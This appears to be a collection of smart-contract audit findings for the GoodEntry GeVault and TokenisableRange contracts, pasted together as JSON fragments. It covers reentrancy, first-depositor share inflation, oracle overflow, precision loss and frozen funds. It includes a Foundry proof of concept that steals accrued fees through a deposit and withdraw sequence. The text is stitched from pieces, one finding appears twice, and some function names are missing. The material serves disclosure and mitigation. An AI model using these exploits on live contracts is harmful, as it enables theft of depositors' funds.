I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

The lack of a reentrancy guard allows for a reentrancy attack, where an attacker can call the `deposit` function while `transferFrom` is processing. This is specifically concerning with ERC777 tokens, which introduce a `tokensToSend` hook that can be invoked before `transferFrom` finalizes, allowing an attacker to re-enter the `deposit` function and inflate the calculated deposit. In the provided proof of concept (PoC), by using the `tokensToSend` hook of an ERC777 token, an attacker can execute the following steps: 1. Make an initial `deposit(1)` call, triggering a call to `transferFrom`. 2. Within the `tokensToSend` hook, re-enter the `deposit` function with a large amount (e.g., `deposit(1_000e18)`). 3. The second deposit call goes through, and due to the unupdated balances, the attacker mints an inflated number of shares. 4. The execution returns to the first `deposit` call, where the transfer from step 1 is completed, and the balances are updated again, allowing more shares to be minted than the amount that was actually deposited.",

The vulnerability stems from the fact that the contract does not enforce a minimum threshold for initial liquidity. Because of this, if the first liquidity provider deposits an extremely small amount, they are still issued liquidity tokens as long as the oracle returns a non-zero price. This initial deposit sets the initial total supply (tSupply), which is then used to calculate subsequent shares. If the attacker, after setting the initial low tSupply, influences the pool's holdings with a high-value transfer, they can greatly increase their share of the pool, potentially diluting the shares of subsequent depositors.\n\nAdditionally, due to the initial small valueX8 and tSupply, when subsequent depositors attempt to add liquidity, the share calculation could round down to zero, especially if vaultValueX8 remains low and is not increased sufficiently before the next deposit occurs. This creates a scenario where new liquidity providers could transfer value to the pool without receiving any liquidity tokens in return, effectively allowing the first depositor to absorb the value of those deposits.\n\nThe smart contract is therefore vulnerable to an attack that exploits the calculation of liquidity shares for initial and subsequent deposits, potentially enabling an initial depositor to manipulate the share distribution to their advantage.",

However, the scale down is not enough and overflow can still happened.\n\n## Proof of Concept\nConsider this scenario, The GeVault is using WBTC for `token0` and WETH for `token1`.\n\nThese are information for the WBTC/WETH from uniswap v3 pool (0x4585FE77225b41b697C938B018E2Ac67Ac5a20c0):\n\nslot0 data (at current time) :\n\n```\nsqrtPriceX96   uint160 :  31520141554881197083247204479961147\n```\n\n`token0` (WBTC) decimals is 8 and `token1` (WETH) decimals is 18.\n\nUsing these information, try to reproduce the `priceX8` calculation :\n\n```solidity\n    function testOraclePrice() public {\n        uint160 sqrtPriceX96 = 31520141554881197083247204479961147;\n        // decimals0 is 8\n        uint priceX8 = 10 ** 8;\n        // Overflow if dont scale down the sqrtPrice before div 2*192 \n        // @audit - the overflow still possible\n        priceX8 =\n            (priceX8 * uint(sqrtPriceX96 / 2 ** 12) ** 2 * 1e8) /\n            2 ** 168;\n        // decimals1 is 18\n        priceX8 = priceX8 / 10 ** 18;\n        assertEq(true, true);\n    }\n```\n\nthe test result in overflow :\n\n```\n[FAIL. Reason: Arithmetic over/underflow] testOraclePrice() \n```\n\nThis will cause calculation still overflow, even using the widely used WBTC/WETH pair \n\n## Tools Used\n\nManual review\n\n## Recommended Mitigation Steps\n\nConsider to change the scale down using the recommended value from uniswap v3 library:\n\nhttps://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/OracleLibrary.sol#L49-L69\n\nor change the scale down similar to the one used inside library\n\n```diff\n  function poolMatchesOracle() public view returns (bool matches){\n    (uint160 sqrtPriceX96,,,,,,) = uniswapPool.slot0();\n    \n    uint decimals0 = token0.decimals();\n    uint decimals1 = token1.decimals();\n    uint priceX8 = 10**decimals0;\n    // Overflow if dont scale down the sqrtPrice before div 2*192\n-    priceX8 = priceX8 * uint(sqrtPriceX96 / 2 ** 12) ** 2 * 1e8 / 2**168;\n+    priceX8 = priceX8 * (uint(sqrtPriceX96) ** 2 / 2 ** 64) * 1e8 / 2**128;\n    priceX8 = priceX8 / 10**decimals1;\n    uint oraclePrice = 1e8 * oracle.getAssetPrice(address(token0)) / oracle.getAssetPrice(address(token1));\n    if (oraclePrice < priceX8 * 101 / 100 && oraclePrice > priceX8 * 99 / 100) matches = true;\n  }\n```\n\n\n\n\n\n\n\n\n## Assessed type\n\nMath"

                    "description": "The vulnerability stems from the division that occurs before the multiplication by `2**96` in the `_getOracleData` function. This can cause a division truncation problem, which in integer arithmetic results in a zero instead of a fractional number when the numerator is smaller than the denominator. Given that token prices can have vast differences, as the example with WETH and BTT demonstrates, the code should be adjusted to handle large disparities in price. If `oracleData.token1Price` greatly exceeds `oracleData.token0Price * 10**18`, then the expression will evaluate to zero. This is because the division operation happens before the multiplication by the scaling factor of `2**96`, and Solidity's integer division truncates towards zero, hence any non-integer result would be truncated. The function `getAmountsForLiquidity` relies on a non-zero `sqrtRatioX96` to correctly calculate the `amount0` and `amount1`. If `sqrtRatioX96` is zero due to the vulnerability, it will incorrectly calculate the liquidity amounts, likely resulting in one of the token amounts being completely ignored. This leads to an inaccurate value of the liquidity position, which could cause undesired and premature liquidations. Before dividing `((oracleData.token0Price * (10**18)) / (oracleData.token1Price))`, the calculation should be adjusted to multiply by `2**96` to ensure that the result does not truncate to zero. This preserves the price representation in X96 type without loss of significant digits. The `poolMatchesOracle` function seems to perform a comparison between two different price feeds. While the vulnerability description does not directly pertain to this function, it indirectly illustrates the importance of accurate price calculations across the smart contract as a whole to prevent financially damaging outcomes. The issue does not lie with the `poolMatchesOracle` function itself based on the vulnerability report provided; it is with the calculation of `oracleData.sqrtPriceX96` used in `getTokenPrice`.",

As a result, the `getAmountsForLiquidity()` function may miscalculate liquidity values, which can ultimately affect the valuation of UniswapV3 NFT positions and lead to improper liquidations.

The code attempts to check if the prices are within a 1% threshold of each other.\n\nThe critical operation in this function is the checking of the price match between the on-chain pool and the oracle. If the oracle fails to provide valid data or if there is an error in retrieving the data (such as returning a price of zero or causing a revert), the function will not be able to determine if the prices match and therefore cannot execute dependent operations (which are not shown in the given code snippet but may include liquidations or other financial decisions based on the price match).\n\nThere is no handling for cases where the oracle fails to respond or provides invalid data; the function simply relies on the data being correct and available. If either of the `getAssetPrice` calls to the oracle reverts or provides invalid data (e.g., zero), no \"last known good value\" or fallback mechanism is apparent in the provided code snippet.\n\nTo mitigate this vulnerability, the smart contract should include error handling for oracle price retrieval. For instance, before using the oracle prices in calculations, one should check if they are reasonable (not zero or unexpectedly high/low), and possibly implement fallback logic to use the last known good value or an alternative data source if the primary oracle fails.

            "detail": "\n# Vulnerability details\n\nThe `TokenisableRange` is designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (`deposit` or `withdraw`). These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool. Yay! \n        console2.log(int(WETH.balanceOf(tokenWhale)) - int(wethBalanceBefore));\n        require(poolSharesBefore ==  tr.balanceOf(tokenWhale));\n    }\n```\nIt is important to note that since the WETH oracle price at the forked block (17811921) is at 1870, above the 500-1000 range, the above PoC works only after fixing my other finding titled:\n> Incorrect Solidity version in FullMath.sol can cause permanent freezing of assets for arithmetic underflow-induced revert\n\n## Tools Used\nCode review\n\n## Recommended Mitigation Steps\n- factor in also the token prices when calculating whether the accrued fees are indeed 1% of the pool\n- when minting TokenisableRange tokens, **always** downscale the minted fees by the relative value of non-distributed fees in the pool:\n```diff\n    // Stack too deep, so localising some variables for feeLiquidity calculations \n-    // If we already clawed back fees earlier, do nothing, else we need to adjust returned liquidity\n-    if ( newFee0 == 0 && newFee1 == 0 ){\n+    {\n      uint256 TOKEN0_PRICE = ORACLE.getAssetPrice(address(TOKEN0.token));\n      uint256 TOKEN1_PRICE = ORACLE.getAssetPrice(address(TOKEN1.token));\n      require (TOKEN0_PRICE > 0 && TOKEN1_PRICE > 0, \"Invalid Oracle Price\");\n      // Calculate the equivalent liquidity amount of the non-yet compounded fees\n      // Assume linearity for liquidity in same tick range; calculate feeLiquidity equivalent and consider it part of base liquidity \n      feeLiquidity = newLiquidity * ( (fee0 * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (fee1 * TOKEN1_PRICE / 10 ** TOKEN1.decimals) )   \n                                    / ( (added0   * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (added1   * TOKEN1_PRICE / 10 ** TOKEN1.decimals) ); \n    }\n```\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nMath"

                    "description": "The vulnerability arises because the `getThisPositionTicks()` function returns the entire balance of tokens held by the contract which consists of both protocol fees (`protocolFee0` and `protocolFee1`) and users' funds. When liquidity is added during `rerange()` using these balances, both the protocol fees and users' funds are used instead of using only the users' funds. As described in the scenario of the report, this means when a rerange occurs after fees have been accumulated, the protocol inadvertently uses its own fees to add liquidity which results in a reduced balance of protocol fees. Consequently, when the `collectProtocolFees()` function is called to transfer out the protocol fees, it may not have sufficient funds due to the previous misuse of fees in the liquidity provision.\n\nThe vulnerability can cause significant issues with the accounting of protocol fees and reduce the total amount that is meant to be collected as protocol revenue. The recommended mitigation steps suggest creating a separate contract (like \"ProtocolFeeReceiver.sol\") to hold the protocol fees and avoid the mixing of users' assets with protocol fees. This would ensure proper separation and accounting of the fees within the system.\n\nThe code snippet provided for `claimFee()` shows how fees are supposed to be handled, but it doesn't directly address the issue described since we do not see it interacting with protocolFee0 and protocolFee1. Nonetheless, the logic in `claimFee()` seems to independently handle the compounding of new fees which might have led to the discovery of the vulnerability when analyzing protocol's fee handling in general. Thus, this logic flaw will need to be fixed to ensure that the protocol fees are accurately recorded and not inadvertently used for liquidity operations.",

An external call to a potentially malicious 'IWETH9' contract via 'weth.withdraw(amountOut)' exposes the function to reentrancy. Subsequently, an Ether transfer to the 'msg.sender' using 'payable(msg.sender).call{value: amountOut}(\"\")' further increases the risk as the sender could be a malicious contract that re-enters the 'swapTokensForExactETH' function. The function's state modification 'acceptPayable = false;' occurs after the transfer, which violates the checks-effects-interactions pattern necessary for preventing reentrancy. The effectiveness of the 'acceptPayable' flag in preventing reentrant calls is unclear without additional context. A comprehensive security measure, such as OpenZeppelin's 'nonReentrant' modifier, appears to be absent. Therefore, the smart contract is susceptible to reentrancy attacks if 'acceptPayable' is not a fully effective security measure.",

            "detail": "\n# Vulnerability details\n\n## Impact\nUsers can lose a portion of their deposited funds if some of their funds haven't been deposited to the underlying Uniswap pools. There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer"

The `getThisPositionTicks` function mistakenly returns the full balance including protocol fees, which should not be used when adding liquidity.\n\nAs a result, the rerange process incorrectly uses funds that should have been set aside as protocol fees to add liquidity. This messes up the calculation of protocol fees that should be available for collection. When `collectProtocolFees` is called to collect the fees, it may fail or collect less than the expected amount because it checks against the incorrect `protocolFees0` and `protocolFees1`, which do not reflect the amounts used in the liquidity operations.\n\nThe suggested mitigation step is appropriate. By transferring the protocol fees to a separate contract or address, the protocol fees would not be incorrectly used in liquidity operations. This would prevent the Mixing of protocol fees with user funds and ensure the integrity of the accounting for protocol fees. The separate contract could be designed to only accept the transfer of protocol fees and correctly handle their distribution or reinvestment.\n\nThis issue is categorized under \"Math\" because it involves incorrect calculations and balances due to the lack of separation between different types of funds within the contract. The smart contract needs to be adjusted to correctly handle the separation of user funds and protocol fees, and the accounting logic needs to be corrected to maintain intended functionality.",

When `price2 * 10000` is divided by `price1` (or vice versa), any fractional result is truncated due to integer division. Multiplying by `10**(18 - priceFeed1.decimals())` afterward aggravates the precision loss because it does not recover the precision that was already lost in the division. The contract assumes that both assets have the same number of decimals and attempts to convert the prices to a uniform 18 decimal format for comparisons. However, due to the division by `1e6` and the subsequent re-multiplication, precision is irretrievably lost, resulting in a potential discrepancy between the reported price and the actual price. The recommended mitigation step is to use a different formula that does not involve dividing before multiplying up to the desired number of decimals. As suggested, a formula like `x * 1e18 / y` would help maintain precision, where `x` and `y` are the prices of the two assets scaled to 18 decimals. This loss of precision is particularly critical since these price calculations could be used for financial decision-making in `returnExpectedBalanceWithoutFees`, potentially leading to incorrect balances being calculated due to the ratio not being accurate. The failure to accurately represent the asset prices and ratios can lead to adverse consequences, such as erroneous liquidations, incorrect exchange rates, and others, depending on how the pegged ratio is utilized within the contract or the broader system.",

            "detail": "\n# Vulnerability details\n\n`TokenisableRange` makes use of the `LiquidityAmounts.getAmountsForLiquidity` helper function in its ,   and  functions to convert UniswapV3 pool liquidity into estimated underlying token amounts. \n\nThis function `getAmountsForLiquidity` will trigger an arithmetic underflow whenever `sqrtRatioX96` is smaller than `sqrtRatioAX96`, causing these functions to revert until this ratio comes back in range and the math no longer overflows.\n\nSuch oracle price conditions are not only possible but also likely to happen in real market conditions, and they can be permanent (i.e. one asset permanently appreciating over the other one).\n\nMoving up the stack, assuming that `LiquidityAmounts.getAmountsForLiquidity` can revert (which is shown in the below PoC with real-world conditions), both the  and  functions can revert. In particular, the former [is called by the `claimFee()`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L187) function, which is always called when  and  liquidity.\n\nThe root cause of this issue is that the FullMath.sol library, [imported from UniswapV3](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) was [altered to build with solidity v0.8.x](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/lib/FullMath.sol#L2), which has under/overflow protection; the library, however, makes use of these by design, so it won't work properly when compiled in v0.8.0 or later:\n```Solidity\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\nlibrary FullMath {\n```\n\n## Impact\nWhen the fair exchange price of the pool backing the TokenisableRange's falls outside the range (higher side), the `deposit` and `withdraw` will always revert, locking the underlying assets in the pool until the price swings to a different value that does not trigger an under/overflow. If the oracle price stays within this range indefinitely, the funds are permanently locked.\n\n## Proof of Concept\nI'll prove that permanent freezing can happen in two steps:\n- first I'll show one condition where the underflow happens\n- then, I'll set up a fuzz test to prove that given an A and B ticker, we cannot find a market price lower than A such that the underflow does not happen \n\nThe most simple way to prove the first point is by calling `LiquidityAmounts.getAmountsForLiquidity` in isolation with real-world values:\n```solidity\n    function testGetAmountsForLiquidityRevert() public {\n        // real-world value: it's in fact the value returned by\n        // V3_FACTORY.getPool(USDC, WETH, 500).slot0();\n        // at block 17811921; it is around 1870 USDC per WETH\n        uint160 sqrtRatioX96 = 1834502451234584391374419429242405;\n\n        // start price and end corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        vm.expectRevert();\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\nHowever, a more integrated test that involves PositionManager can also be considered:\n```\n    function testPocReturnExpectedBalanceUnderflow() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n        vm.startPrank(tokenWhale);\n        TokenisableRange tr = new TokenisableRange();\n        tr.initProxy(AaveOracle, USDC, WETH, 1700e10, 1800e10, \"Test1\", \"T1\", false);\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n        vm.expectRevert();\n        tr.returnExpectedBalance(0, 0);\n    }\n```\n\nThen, we can prove the second point with a negative fuzz test:\n```Solidity\n    function testFailPermanentFreeze(uint160 sqrtRatioX96) public {\n        // start & and price, corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        // make sure that the market ratio is lower than the lower ticker\n        // that is the range where I first observed the underflow\n        // (WETH above 1800 USDC)\n        sqrtRatioX96 = sqrtRatioX96 % (sqrtRatioAX96 - 1);\n\n        // expect a revert here\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\n## Tools Used\nIDE, Foundry\n\n## Recommended Mitigation Steps\nRestore [the original FullMath.sol library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) so it compiles with solc versions earlier than 0.8.0.\n\n```Solidity\n// SPDX-License-Identifier: GPL-3.0\n- pragma solidity ^0.8.4;\n+ pragma solidity >=0.4.0 <0.8.0;\n\n/// @title Contains 512-bit math functions\n/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\n```\n\nAnother possible option, which is however not recommended, is to enclose the non-assembly statements of FullMath.sol in an `unchecked` block.\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow"

            "detail": "\n# Vulnerability details\n\n`TokenisableRange` makes use of the `LiquidityAmounts.getAmountsForLiquidity` helper function in its ,   and  functions to convert UniswapV3 pool liquidity into estimated underlying token amounts. \n\nThis function `getAmountsForLiquidity` will trigger an arithmetic underflow whenever `sqrtRatioX96` is smaller than `sqrtRatioAX96`, causing these functions to revert until this ratio comes back in range and the math no longer overflows.\n\nSuch oracle price conditions are not only possible but also likely to happen in real market conditions, and they can be permanent (i.e. one asset permanently appreciating over the other one).\n\nMoving up the stack, assuming that `LiquidityAmounts.getAmountsForLiquidity` can revert (which is shown in the below PoC with real-world conditions), both the  and  functions can revert. In particular, the former [is called by the `claimFee()`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L187) function, which is always called when  and  liquidity.\n\nThe root cause of this issue is that the FullMath.sol library, [imported from UniswapV3](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) was [altered to build with solidity v0.8.x](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/lib/FullMath.sol#L2), which has under/overflow protection; the library, however, makes use of these by design, so it won't work properly when compiled in v0.8.0 or later:\n```Solidity\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\nlibrary FullMath {\n```\n\n## Impact\nWhen the fair exchange price of the pool backing the TokenisableRange's falls outside the range (higher side), the `deposit` and `withdraw` will always revert, locking the underlying assets in the pool until the price swings to a different value that does not trigger an under/overflow. If the oracle price stays within this range indefinitely, the funds are permanently locked.\n\n## Proof of Concept\nI'll prove that permanent freezing can happen in two steps:\n- first I'll show one condition where the underflow happens\n- then, I'll set up a fuzz test to prove that given an A and B ticker, we cannot find a market price lower than A such that the underflow does not happen \n\nThe most simple way to prove the first point is by calling `LiquidityAmounts.getAmountsForLiquidity` in isolation with real-world values:\n```solidity\n    function testGetAmountsForLiquidityRevert() public {\n        // real-world value: it's in fact the value returned by\n        // V3_FACTORY.getPool(USDC, WETH, 500).slot0();\n        // at block 17811921; it is around 1870 USDC per WETH\n        uint160 sqrtRatioX96 = 1834502451234584391374419429242405;\n\n        // start price and end corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        vm.expectRevert();\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\nHowever, a more integrated test that involves PositionManager can also be considered:\n```\n    function testPocReturnExpectedBalanceUnderflow() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n        vm.startPrank(tokenWhale);\n        TokenisableRange tr = new TokenisableRange();\n        tr.initProxy(AaveOracle, USDC, WETH, 1700e10, 1800e10, \"Test1\", \"T1\", false);\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n        vm.expectRevert();\n        tr.returnExpectedBalance(0, 0);\n    }\n```\n\nThen, we can prove the second point with a negative fuzz test:\n```Solidity\n    function testFailPermanentFreeze(uint160 sqrtRatioX96) public {\n        // start & and price, corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        // make sure that the market ratio is lower than the lower ticker\n        // that is the range where I first observed the underflow\n        // (WETH above 1800 USDC)\n        sqrtRatioX96 = sqrtRatioX96 % (sqrtRatioAX96 - 1);\n\n        // expect a revert here\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\n## Tools Used\nIDE, Foundry\n\n## Recommended Mitigation Steps\nRestore [the original FullMath.sol library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) so it compiles with solc versions earlier than 0.8.0.\n\n```Solidity\n// SPDX-License-Identifier: GPL-3.0\n- pragma solidity ^0.8.4;\n+ pragma solidity >=0.4.0 <0.8.0;\n\n/// @title Contains 512-bit math functions\n/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\n```\n\nAnother possible option, which is however not recommended, is to enclose the non-assembly statements of FullMath.sol in an `unchecked` block.\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow"

This can cause the `idleETH` balance to be reduced prematurely, affecting the reward distribution logic in such a way that when `claimRewards` is actually called, it leads to an incorrect calculation of rewards due to an altered state (increased `totalRewardsReceived` and `accumulatedETHPerLPShare`). This vulnerability can be exploited to claim more rewards than a user is legitimately entitled to. The suggested mitigation step is to reorder the instructions within the `withdrawETH` function to decrease `idleETH` after the LP tokens have been burned but before the external call to send ETH. This reordering ensures that the state is correctly updated when the external call is made and reduces the window of opportunity for a reentrant call to interfere with the state in a malicious way.

However, if price moves outside the range during the transaction, user will be charged an excessive fee.\n\n## Proof of Concept\n    if ( fee0+fee1 > 0 && ( n0 > 0 || fee0 == 0) && ( n1 > 0 || fee1 == 0 ) ){\n      address pool = V3_FACTORY.getPool(address(TOKEN0.token), address(TOKEN1.token), feeTier * 100);\n      (uint160 sqrtPriceX96,,,,,,)  = IUniswapV3Pool(pool).slot0();\n      (uint256 token0Amount, uint256 token1Amount) = LiquidityAmounts.getAmountsForLiquidity( sqrtPriceX96, TickMath.getSqrtRatioAtTick(lowerTick), TickMath.getSqrtRatioAtTick(upperTick), liquidity);\n      if (token0Amount + fee0 > 0) newFee0 = n0 * fee0 / (token0Amount + fee0);\n      if (token1Amount + fee1 > 0) newFee1 = n1 * fee1 / (token1Amount + fee1);\n      fee0 += newFee0;\n      fee1 += newFee1; \n      n0   -= newFee0;\n      n1   -= newFee1;\n    }\n\nSuppose range is [120, 122] and current price is 121.

